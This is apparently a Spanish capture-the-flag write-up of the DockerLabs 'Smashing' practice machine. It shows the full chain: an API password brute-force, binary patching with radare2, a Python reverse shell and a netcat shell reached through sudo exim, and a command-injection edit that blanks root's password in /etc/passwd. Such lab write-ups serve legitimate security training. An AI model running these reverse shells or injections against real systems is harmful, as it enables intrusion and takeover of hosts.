---
title: Smashing
description: DockerLabs es una plataforma gratuita diseñada para practicar hacking ético al alcance de todo el mundo utilizando Docker. DockerLabs ofrece un entorno seguro y accesible para desplegar laboratorios vulnerables de la forma más eficiente y sencilla posible.
date: 2025-03-10
toc: true
pin: false
image:
 path: /assets/img/dockerlabs-writeup-smashing/smashing_logo.png
categories:
  - Docker Labs
tags:
  - linux
  - dockerlabs
  - ssh
  - http
  - tcp
  - api
  - fuzzing web
  - insecure deserialization
  - password attacks
  - buffer overflow
  - sudo abuse
  - interactive tty
  - idor
  - os command injection
  - information gathering
  - web analysis
  - vulnerability exploitation
  - user pivoting
  - privilege escalation

---
## Information Gathering

El análisis inicial comienza con el comando ping para confirmar la accesibilidad de la máquina objetivo en la red.

```terminal
/home/kali/Documents/dockerlabs/smashing:-$ ping -c 1 127.17.0.2
PING 127.17.0.2 (127.17.0.2) 56(84) bytes of data.
64 bytes from 127.17.0.2: icmp_seq=1 ttl=64 time=0.039 ms

--- 127.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.039/0.039/0.039/0.000 ms
```

Realizo un escaneo agresivo de puertos con nmap, lo que me permite identificar rápidamente todos los puertos abiertos.

```terminal
/home/kali/Documents/dockerlabs/smashing:-$ sudo nmap -p- --open -sS --min-rate 5000 -vvv 127.17.0.2 -n -Pn -oG nmap1
Host: 127.17.0.2 ()     Status: Up
Host: 127.17.0.2 ()     Ports: 22/open/tcp//ssh///, 80/open/tcp//http///        Ignored State: closed (65533)
```

Profundizo en los puertos detectados, recopilando información detallada sobre los servicios y versiones en ejecución.

```terminal
/home/kali/Documents/dockerlabs/smashing:-$ sudo nmap -sCV -p22,80 -vvv 127.17.0.2 -oN nmap2
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
| ssh-hostkey: 
|   256 8e:f8:76:54:88:0f:c9:04:8c:72:ff:6c:43:57:3e:cb (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGI2EPGJiWYzfBBmVg+zRyyANTgrjZ8/oiGixsiASmAJsn8qNufYz8eVqlBKMx5s+kU2X4mV+FXfd2vdzIYq0s8=
|   256 f9:e7:95:81:58:57:a1:cc:b1:78:96:06:5c:17:1d:ca (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIE5x8r9dPgJqcASD5dVl2UkzZWeemYbDy5jnfx3xb+8u
80/tcp open  http    syn-ack ttl 64 Werkzeug httpd 2.2.2 (Python 3.11.2)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Werkzeug/2.2.2 Python/3.11.2
|_http-title: Did not follow redirect to http://cybersec.dl
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
```terminal
/home/kali/Documents/dockerlabs/smashing:-$ echo '127.17.0.2\tcybersec.dl' | sudo tee -a /etc/hosts
```
```terminal
/home/kali/Documents/dockerlabs/smashing:-$ whatweb cybersec.dl
http://cybersec.dl [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/2.2.2 Python/3.11.2], IP[127.17.0.2], Python[3.11.2], Script, Title[CyberSec Corp], Werkzeug[2.2.2]
```

---
## Web Analysis

El análisis de la web revela dos puntos de interés: un formulario de contacto y una funcionalidad inusual que se desliza por la página.

![](assets/img/dockerlabs-writeup-smashing/smashing1_1.png)

Al inspeccionar el código fuente, identifico que se utiliza la función `fetch` para realizar solicitudes a `/api/1passwsecu0`.

![](assets/img/dockerlabs-writeup-smashing/smashing1_2.png)

Ejecuto un escaneo de directorios sobre `/api/`, encontrando un archivo llamado `login`.

```terminal
/home/kali/Documents/dockerlabs/smashing:-$ dirb http://cybersec.dl/api/
+ http://cybersec.dl/api/login (CODE:405|SIZE:153)
```

Sin embargo, el intento de acceso devuelve un código `405 Method Not Allowed`, indicando que la ruta existe pero no permite solicitudes con el método utilizado.

![](assets/img/dockerlabs-writeup-smashing/smashing2_1.png)

---
## Vulnerability Exploitation

Sabiendo esto, intercepto la solicitud con BurpSuite y cambio el método utilizado.

```http
POST /api/login HTTP/1.1
Host: cybersec.dl
```

![](assets/img/dockerlabs-writeup-smashing/smashing2_2.png)

Ahora la respuesta cambia, indicando que espera contenido en formato JSON.

Modifico el parámetro `Content-Type` para que tenga el valor `application/json` en lugar de `x-www-form-urlencoded`.

```http
POST /api/login HTTP/1.1
Host: cybersec.dl
Content-Type: application/json
```

![](assets/img/dockerlabs-writeup-smashing/smashing2_3.png)

Aún así, la solicitud falla, ya que no estoy enviando un cuerpo en formato JSON.

Dado que el endpoint es `/api/login`, incluyo los elementos username y password en la solicitud.

```http
POST /api/login HTTP/1.1
Host: cybersec.dl
Content-Type: application/json

{
  "username":"admin",
  "password":"123"
}
```

![](assets/img/dockerlabs-writeup-smashing/smashing2_5.png)

Aunque la respuesta devuelve `401 UNAUTHORIZED`, confirmo que el servicio procesa las credenciales.

---

No he encontrado ningún usuario o contraseña específica. Sin embargo, puedo probar con usuarios comunes como `admin` o `administrator` y, si existen, intentar descubrir su contraseña mediante fuerza bruta.

```terminal
/home/kali/Documents/dockerlabs/smashing:-$ wfuzz -w /usr/share/wordlists/rockyou.txt -u http://cybersec.dl/api/login -X POST -H "Content-Type: application/json" -d '{"username": "admin", "password": "FUZZ"}' --hw=5
=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================
000000787:   200        12 L     53 W       650 Ch      "undertaker"
```

De esta manera, descubro las credenciales `admin`:`undertaker`.

![](assets/img/dockerlabs-writeup-smashing/smashing2_6.png)

Al autenticarse, el sistema devuelve información adicional, incluyendo varias rutas y subdominios.

```terminal
/home/kali/Documents/dockerlabs/smashing:-$ curl -s -X POST http://cybersec.dl/api/login -H "Content-Type: application/json" -d '{"username": "admin", "password": "undertaker"}' | jq
{
  "company": {
    "URLs_web": "cybersec.dl, bin.cybersec.dl, mail.cybersec.dl, dev.cybersec.dl, cybersec.dl/downloads, internal-api.cybersec.dl, 0internal_down.cybersec.dl, internal.cybersec.dl, cybersec.dl/documents, cybersec.dl/api/cpu, cybersec.dl/api/login",
    "address": "New York, EEUU",
    "branches": "Brazil, Curacao, Lithuania, Luxembourg, Japan, Finland",
    "customers": "ADIDAS, COCACOLA, PEPSICO, Teltonika, Toray Industries, Weg, CURALINk",
    "name": "CyberSec Corp",
    "phone": "+1322302450134200",
    "services": "Auditorias de seguridad, Pentesting, Consultoria en ciberseguridad"
  },
  "message": "Login successful"
}
```

Extraigo los subdominios y los añado al archivo `/etc/hosts`.

```terminal
/home/kali/Documents/dockerlabs/smashing:-$ curl -s -X POST http://cybersec.dl/api/login -H "Content-Type: application/json" -d '{"username": "admin", "password": "undertaker"}' | jq -r '.company.URLs_web' | tr ', ' '\n' | grep -E '^[^.]+\.cybersec\.dl$'
bin.cybersec.dl
mail.cybersec.dl
dev.cybersec.dl
internal-api.cybersec.dl
0internal_down.cybersec.dl
internal.cybersec.dl
```
```terminal
/home/kali/Documents/dockerlabs/smashing:-$ sudo sed -i '$d' /etc/hosts
/home/kali/Documents/dockerlabs/smashing:-$ echo '127.17.0.2\tcybersec.dl\tbin.cybersec.dl\tmail.cybersec.dl\tdev.cybersec.dl\tinternal-api.cybersec.dl\t0internal_down.cybersec.dl\tinternal.cybersec.dl' | sudo tee -a /etc/hosts
```

Dentro del subdominio `0internal_down.cybersec.dl`, encuentro dos archivos: un binario y un archivo de texto.

![](assets/img/dockerlabs-writeup-smashing/smashing2_7.png)

El archivo de texto menciona que el binario contiene una contraseña perteneciente al usuario `flipsy`.

```terminal
/home/kali/Documents/dockerlabs/smashing:-$ cat smashing_note.txt 
De: flypsi
Para: Darksblack

Darksblack, necesito que me ayudes a recuperar mi password, te deje un binario para que lo analises y la extraigas, habia dejado mi password incorporada en el para
un CTF que estaba realizando pero perdi mis apuntes... (sisisisi ya se que me has dicho que no reutilice password, pero se me olvidan)
```

---
### Buffer Overflow

```terminal
/home/kali/Documents/dockerlabs/smashing:-$ file smashing
smashing: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=3b7f42536642d56c9bf5ebcebeddc18d8336abe8, for GNU/Linux 3.2.0, not stripped
```

Al ejecutar la aplicación, se muestra un mensaje de bienvenida y se me solicita un nombre, como parte de una aplicación interactiva.

![](assets/img/dockerlabs-writeup-smashing/smashing3_2.png){: width="972" height="589" .w-75 .normal}
![](assets/img/dockerlabs-writeup-smashing/smashing3_1.png)

Extraigo cadenas en ASCII del binario y obtengo varias palabras sospechosas, aunque ninguna contiene la contraseña "completa".

```terminal
/home/kali/Documents/dockerlabs/smashing:-$ hexdump smashing -C | grep -o '|[^|]*|' | sed 's/|//g' | grep -v '^\s*$' | tr '\n' ' '
salomon89014max.miralla400tock6.45678fbichacuviii.pepinillochingon.chocolate3000.balulero
```

Para explotar la vulnerabilidad, ejecuto radare2 en modo escritura para modificar la dirección de memoria. Mi objetivo es cambiar la llamada a `sym.factor2` por `sym.factor1`. Identifico la dirección a modificar:

* `0x000023dc      e8fafeffff     call sym.factor2`

Procedo a cambiarla con el siguiente comando.

```terminal
/home/kali/Documents/dockerlabs/smashing:-$ radare2 -A -w smashing

[0x000011d0]> s 0x000023dc
[0x000023dc]> wx e8 c6 fc ff ff @ 0x000023dc
[0x000023dc]> pd 3
```

![](assets/img/dockerlabs-writeup-smashing/smashing3_3.png)

Verifico que el cambio ha tenido efecto al ejecutar el binario nuevamente, y ahora se devuelve la información en formato base58.

```terminal
/home/kali/Documents/dockerlabs/smashing:-$ ./smashing
Bienvenido al programa interactivo.
info: 2tP42bSzBTnmEAuAGkxj3
¿Te gustaría saber datos interesantes sobre ciberseguridad? (si/no): no
Gracias por usar el programa. Adiós!
```

Convierto la cadena base58 para obtener la contraseña.

```terminal
/home/kali/Documents/dockerlabs/smashing:-$ echo -n '2tP42bSzBTnmEAuAGkxj3' | base58 -d
Chocolate.1704

/home/kali/Documents/dockerlabs/smashing:-$ ssh flipsy@127.17.0.2
flipsy@127.17.0.2's password: Chocolate.1704

$ id
uid=1001(flipsy) gid=1001(flipsy) groups=1001(flipsy),100(users)
```

---
## User Pivoting

```terminal
$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/sh
darksblack:x:1000:1000:,,,:/home/darksblack:/bin/sh
flipsy:x:1001:1001:,,,:/home/flipsy:/bin/sh
```

`Flipsy` puede ejecutar el comando `/usr/sbin/exim` como `darksblack` sin necesidad de contraseña.

```terminal
$ sudo -l
Matching Defaults entries for flipsy on dockerlabs:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User flipsy may run the following commands on dockerlabs:
    (darksblack) NOPASSWD: /usr/sbin/exim
```

Aprovecho este permiso para pivotar al usuario `darksblack`. Para ello, creo un script malicioso en `/tmp/shell` que inicia una reverse shell utilizando Python.

```terminal
$ echo '#!/bin/sh' > /tmp/shell && echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"172.17.0.1\",4321));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")'" >> /tmp/shell && chmod 777 /tmp/shell
```

Luego, ejecuto el siguiente comando, utilizando sudo para invocar exim como `darksblack` y ejecutar mi script.

```terminal
/home/kali/Documents/dockerlabs/smashing:-$ nc -lnvp 4321
	listening on [any] 4321 ...

$ sudo -u darksblack exim -be '${run{/tmp/shell}}'

	... connect to [172.17.0.1] from (UNKNOWN) [192.168.0.171] 36172
$ id
uid=1000(darksblack) gid=1000(darksblack) groups=1000(darksblack),100(users),1002(cyber)
```

Debido a que la conexión se corta después de un tiempo, lanzo otra conexión en un puerto distinto.

```terminal
/home/kali/Documents/dockerlabs/smashing:-$ nc -lnvp 4322
	listening on [any] 4322 ...

$ netcat -c sh 172.17.0.1 4322

	... connect to [172.17.0.1] from (UNKNOWN) [192.168.0.171] 54228
id
uid=1000(darksblack) gid=1000(darksblack) groups=1000(darksblack),100(users),1002(cyber)
```

---
## Privilege Escalation

```terminal
script /dev/null -c sh
$ ^Z
/home/kali/Documents/dockerlabs/smashing:-$ stty raw -echo;fg
[1]  + continued  nc -lnvp 4322
                               reset xterm
$ export TERM=xterm
$ export SHELL=sh
```

Busco archivos pertenecientes al grupo `cyber`. Y Encuentro un script que está codificado en Base64.

```terminal
$ find / -group 1002 2>/dev/null
/var/www/html/serverpi.py

$ cat /var/www/html/serverpi.py
```

![](assets/img/dockerlabs-writeup-smashing/smashing4_1.png)

Copio el contenido y lo decodifico en mi máquina local.

```terminal
/home/kali/Documents/dockerlabs/smashing:-$ cat serverpi.py
aW1wb3J0IGh0dHAuc2VydmVyCmltcG9ydCBzb2NrZXRzZXJ2ZXIKaW1wb3J0IHVybGxpYi5wYXJzZQppbXBvcnQgc3VicHJvY2VzcwppbXBvcnQgYmFzZTY0CgpQT1JUID0gMjUwMDAKCkFVVEhfS0VZX0JBU0U2NCA9ICJNREF3TUdONVltVnljMlZqWDJkeWIzVndYM0owWHpBd01EQXdNQW89IgoKY2xhc3MgSGFuZGxlcihodHRwLnNlcnZlci5TaW1wbGVIVFRQUmVxdWVzdEhhbmRsZXIpOgogICAgZGVmIGRvX0dFVChzZWxmKToKICAgICAgICBhdXRoX2hlYWRlciA9IHNlbGYuaGVhZGVycy5nZXQoJ0F1dGhvcml6YXRpb24nKQoKICAgICAgICBpZiBhdXRoX2hlYWRlciBpcyBOb25lIG9yIG5vdCBhdXRoX2hlYWRlci5zdGFydHN3aXRoKCdCYXNpYycpOgogICAgICAgICAgICBzZWxmLnNlbmRfcmVzcG9uc2UoNDAxKQogICAgICAgICAgICBzZWxmLnNlbmRfaGVhZGVyKCJDb250ZW50LXR5cGUiLCAidGV4dC9wbGFpbiIpCiAgICAgICAgICAgIHNlbGYuZW5kX2hlYWRlcnMoKQogICAgICAgICAgICBzZWxmLndmaWxlLndyaXRlKGIiQXV0aG9yaXphdGlvbiBoZWFkZXIgaXMgbWlzc2luZyBvciBpbmNvcnJlY3QiKQogICAgICAgICAgICByZXR1cm4KCiAgICAgICAgIyBFeHRyYWVyIGxhIGNsYXZlIGVudmlhZGEgcG9yIGVsIGNsaWVudGUgKGVuIEJhc2U2NCkKICAgICAgICBlbmNvZGVkX2tleSA9IGF1dGhfaGVhZGVyLnNwbGl0KCdCYXNpYyAnKVsxXQoKICAgICAgICAjIERlY29kaWZpY2FyIGxhIGNsYXZlIGFsbWFjZW5hZGEgZW4gQmFzZTY0CiAgICAgICAgZGVjb2RlZF9zdG9yZWRfa2V5ID0gYmFzZTY0LmI2NGRlY29kZShBVVRIX0tFWV9CQVNFNjQpLmRlY29kZSgpLnN0cmlwKCkgICMgRWxpbWluYXIgc2FsdG9zIGRlIGzDrW5lYQoKICAgICAgICAjIERlY29kaWZpY2FyIGxhIGNsYXZlIGVudmlhZGEgcG9yIGVsIGNsaWVudGUKICAgICAgICBkZWNvZGVkX2NsaWVudF9rZXkgPSBiYXNlNjQuYjY0ZGVjb2RlKGVuY29kZWRfa2V5KS5kZWNvZGUoKS5zdHJpcCgpICAjIEVsaW1pbmFyIHNhbHRvcyBkZSBsw61uZWEKCiAgICAgICAgIyBDb21wYXJhciBsYXMgY2xhdmVzCiAgICAgICAgaWYgZGVjb2RlZF9jbGllbnRfa2V5ICE9IGRlY29kZWRfc3RvcmVkX2tleToKICAgICAgICAgICAgc2VsZi5zZW5kX3Jlc3BvbnNlKDQwMykKICAgICAgICAgICAgc2VsZi5zZW5kX2hlYWRlcigiQ29udGVudC10eXBlIiwgInRleHQvcGxhaW4iKQogICAgICAgICAgICBzZWxmLmVuZF9oZWFkZXJzKCkKICAgICAgICAgICAgc2VsZi53ZmlsZS53cml0ZShiIkludmFsaWQgYXV0aG9yaXphdGlvbiBrZXkiKQogICAgICAgICAgICByZXR1cm4KCiAgICAgICAgIyBQcm9jZXNhciBlbCBwYXLDoW1ldHJvICdleGVjJwogICAgICAgIHBhcnNlZF9wYXRoID0gdXJsbGliLnBhcnNlLnVybHBhcnNlKHNlbGYucGF0aCkKICAgICAgICBxdWVyeV9wYXJhbXMgPSB1cmxsaWIucGFyc2UucGFyc2VfcXMocGFyc2VkX3BhdGgucXVlcnkpCgogICAgICAgIGlmICdleGVjJyBpbiBxdWVyeV9wYXJhbXM6CiAgICAgICAgICAgIGNvbW1hbmQgPSBxdWVyeV9wYXJhbXNbJ2V4ZWMnXVswXQogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBhbGxvd2VkX2NvbW1hbmRzID0gWydscycsICd3aG9hbWknXQogICAgICAgICAgICAgICAgaWYgbm90IGFueShjb21tYW5kLnN0YXJ0c3dpdGgoY21kKSBmb3IgY21kIGluIGFsbG93ZWRfY29tbWFuZHMpOgogICAgICAgICAgICAgICAgICAgIHNlbGYuc2VuZF9yZXNwb25zZSg0MDMpCiAgICAgICAgICAgICAgICAgICAgc2VsZi5zZW5kX2hlYWRlcigiQ29udGVudC10eXBlIiwgInRleHQvcGxhaW4iKQogICAgICAgICAgICAgICAgICAgIHNlbGYuZW5kX2hlYWRlcnMoKQogICAgICAgICAgICAgICAgICAgIHNlbGYud2ZpbGUud3JpdGUoYiJDb21tYW5kIG5vdCBhbGxvd2VkLiIpCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuCgogICAgICAgICAgICAgICAgcmVzdWx0ID0gc3VicHJvY2Vzcy5jaGVja19vdXRwdXQoY29tbWFuZCwgc2hlbGw9VHJ1ZSwgc3RkZXJyPXN1YnByb2Nlc3MuU1RET1VUKQogICAgICAgICAgICAgICAgc2VsZi5zZW5kX3Jlc3BvbnNlKDIwMCkKICAgICAgICAgICAgICAgIHNlbGYuc2VuZF9oZWFkZXIoIkNvbnRlbnQtdHlwZSIsICJ0ZXh0L3BsYWluIikKICAgICAgICAgICAgICAgIHNlbGYuZW5kX2hlYWRlcnMoKQogICAgICAgICAgICAgICAgc2VsZi53ZmlsZS53cml0ZShyZXN1bHQpCiAgICAgICAgICAgIGV4Y2VwdCBzdWJwcm9jZXNzLkNhbGxlZFByb2Nlc3NFcnJvciBhcyBlOgogICAgICAgICAgICAgICAgc2VsZi5zZW5kX3Jlc3BvbnNlKDUwMCkKICAgICAgICAgICAgICAgIHNlbGYuc2VuZF9oZWFkZXIoIkNvbnRlbnQtdHlwZSIsICJ0ZXh0L3BsYWluIikKICAgICAgICAgICAgICAgIHNlbGYuZW5kX2hlYWRlcnMoKQogICAgICAgICAgICAgICAgc2VsZi53ZmlsZS53cml0ZShlLm91dHB1dCkKICAgICAgICBlbHNlOgogICAgICAgICAgICBzZWxmLnNlbmRfcmVzcG9uc2UoNDAwKQogICAgICAgICAgICBzZWxmLnNlbmRfaGVhZGVyKCJDb250ZW50LXR5cGUiLCAidGV4dC9wbGFpbiIpCiAgICAgICAgICAgIHNlbGYuZW5kX2hlYWRlcnMoKQogICAgICAgICAgICBzZWxmLndmaWxlLndyaXRlKGIiTWlzc2luZyAnZXhlYycgcGFyYW1ldGVyIGluIFVSTCIpCgp3aXRoIHNvY2tldHNlcnZlci5UQ1BTZXJ2ZXIoKCIxMjcuMC4wLjEiLCBQT1JUKSwgSGFuZGxlcikgYXMgaHR0cGQ6CiAgICBodHRwZC5zZXJ2ZV9mb3JldmVyKCkK
```

```terminal
/home/kali/Documents/dockerlabs/smashing:-$ cat serverpi.py | base64 -d > serverpi_decode.py
```

El script `serverpi.py` es un servidor HTTP en Python que permite la ejecución de comandos específicos (ls y whoami) si se proporciona una clave de autenticación correcta en Base64.

```python
import http.server
import socketserver
import urllib.parse
import subprocess
import base64

PORT = 25000

AUTH_KEY_BASE64 = "MDAwMGN5YmVyc2VjX2dyb3VwX3J0XzAwMDAwMAo="

class Handler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        auth_header = self.headers.get('Authorization')

        if auth_header is None or not auth_header.startswith('Basic'):
            self.send_response(401)
            self.send_header("Content-type", "text/plain")
            self.end_headers()
            self.wfile.write(b"Authorization header is missing or incorrect")
            return

        # Extraer la clave enviada por el cliente (en Base64)
        encoded_key = auth_header.split('Basic ')[1]

        # Decodificar la clave almacenada en Base64
        decoded_stored_key = base64.b64decode(AUTH_KEY_BASE64).decode().strip()  # Eliminar saltos de línea

        # Decodificar la clave enviada por el cliente
        decoded_client_key = base64.b64decode(encoded_key).decode().strip()  # Eliminar saltos de línea

        # Comparar las claves
        if decoded_client_key != decoded_stored_key:
            self.send_response(403)
            self.send_header("Content-type", "text/plain")
            self.end_headers()
            self.wfile.write(b"Invalid authorization key")
            return

        # Procesar el parámetro 'exec'
        parsed_path = urllib.parse.urlparse(self.path)
        query_params = urllib.parse.parse_qs(parsed_path.query)

        if 'exec' in query_params:
            command = query_params['exec'][0]
            try:
                allowed_commands = ['ls', 'whoami']
                if not any(command.startswith(cmd) for cmd in allowed_commands):
                    self.send_response(403)
                    self.send_header("Content-type", "text/plain")
                    self.end_headers()
                    self.wfile.write(b"Command not allowed.")
                    return

                result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                self.send_response(200)
                self.send_header("Content-type", "text/plain")
                self.end_headers()
                self.wfile.write(result)
            except subprocess.CalledProcessError as e:
                self.send_response(500)
                self.send_header("Content-type", "text/plain")
                self.end_headers()
                self.wfile.write(e.output)
        else:
            self.send_response(400)
            self.send_header("Content-type", "text/plain")
            self.end_headers()
            self.wfile.write(b"Missing 'exec' parameter in URL")

with socketserver.TCPServer(("127.0.0.1", PORT), Handler) as httpd:
    httpd.serve_forever()
```

```terminal
$ curl "http://127.0.0.1:25000?exec=id" -H "Authorization: Basic MDAwMGN5YmVyc2VjX2dyb3VwX3J0XzAwMDAwMAo="
uid=0(root) gid=0(root) groups=0(root)
```

El servidor ejecuta comandos en el sistema mediante `subprocess.check_output()`, lo que permite inyectar comandos adicionales. Puedo modificar `/etc/passwd`, eliminando la contraseña de `root`.

```terminal
$ curl "http://127.0.0.1:25000?exec=sed%20s/root:x:/root::/g%20-i%20/etc/passwd" -H "Authorization: Basic MDAwMGN5YmVyc2VjX2dyb3VwX3J0XzAwMDAwMAo="

$ su root
# id
uid=0(root) gid=0(root) groups=0(root)
```